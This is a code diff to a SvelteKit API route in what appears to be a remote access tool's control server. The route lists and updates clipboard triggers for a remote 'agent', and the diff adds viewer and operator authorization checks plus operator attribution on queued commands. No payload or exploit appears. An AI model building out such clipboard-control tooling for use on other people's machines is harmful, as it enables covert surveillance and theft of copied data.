@@ -3,6 +3,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { clipboardManager } from '$lib/server/rat/clipboard';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import type {
 	ClipboardCommandPayload,
 	ClipboardFormat,
@@ -83,21 +84,25 @@ function normalizeTrigger(input: ClipboardTriggerInput, now: string): ClipboardT
 	} satisfies ClipboardTrigger;
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const triggers = clipboardManager.listTriggers(id);
 	return json({ triggers });
 };
 
-export const PUT: RequestHandler = async ({ params, request }) => {
+export const PUT: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: TriggerUpdateRequest;
 	try {
@@ -117,7 +122,7 @@ export const PUT: RequestHandler = async ({ params, request }) => {
 
 	try {
 		const command: ClipboardCommandPayload = { action: 'sync-triggers', triggers: normalized };
-		registry.queueCommand(id, { name: 'clipboard', payload: command });
+		registry.queueCommand(id, { name: 'clipboard', payload: command }, { operatorId: user.id });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
